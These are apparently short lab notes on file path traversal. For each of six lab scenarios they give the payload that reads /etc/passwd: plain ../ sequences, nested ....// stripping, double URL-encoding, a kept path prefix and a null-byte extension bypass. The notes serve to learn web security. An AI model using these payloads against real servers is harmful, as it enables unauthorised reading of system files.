1. File path traversal, simple case
	
	?filename=/var/www/images/../../../etc/passw
	Modify the filename parameter, giving it the value ../../../etc/passwd

2. File path traversal, traversal sequences blocked with absolute path bypass

	/etc/passwd overserve that the response contains the contents of the file	

3. File path traversal, traversal sequences stripped non-recursively

	 Modify the filename parameter, giving it the value: ....//....//....//etc/passwd 

4. File path traversal, traversal sequences stripped with superfluous URL-decode

	decode in url one time or two times or more here slash (/) has decoded for two times
	..%252f..%252f..%252fetc/passwd.

5. File path traversal, validation of start of path

	here if observe the filename path closly we can notice that file path has already give so
	only use the /
	Modify the filename parameter, giving it the value /var/www/images/../../../etc/passwd. 

6. File path traversal, validation of file extension with null byte bypass

	 Modify the filename parameter, giving it the value ../../../etc/passwd%00.png.
